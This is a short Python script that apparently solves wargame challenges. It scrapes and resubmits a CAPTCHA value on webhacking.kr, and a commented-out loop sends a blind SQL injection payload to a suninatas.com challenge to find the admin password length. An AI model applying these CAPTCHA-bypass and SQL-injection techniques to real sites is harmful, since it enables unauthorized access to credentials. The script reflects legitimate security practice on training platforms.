import requests
from bs4 import BeautifulSoup

url = 'https://webhacking.kr/challenge/code-4/'

res = requests.get(url)
soup = BeautifulSoup(res.text, 'html.parser')

captcha = soup.find('input', type='button')['value']
print(captcha)

res = requests.post(url, data={'id':'id', 'cmt':'cmt', 'captcha':captcha})
print(res.text)


    # for i in range(1, 20):
    #     URL = f"http://suninatas.com/challenge/web22/web22.asp?id=admin'+AND+LEN(pw)={i}--&pw=1"
    #     res = requests.get(URL)
    #     soup = BeautifulSoup(res.text, 'html.parser')
    #     try:
    #         target = soup.find_all("font")[2].get_text()
    #         if target == 'admin':
    #             pw_len = i
    #             break
    #     except:
    #         pass
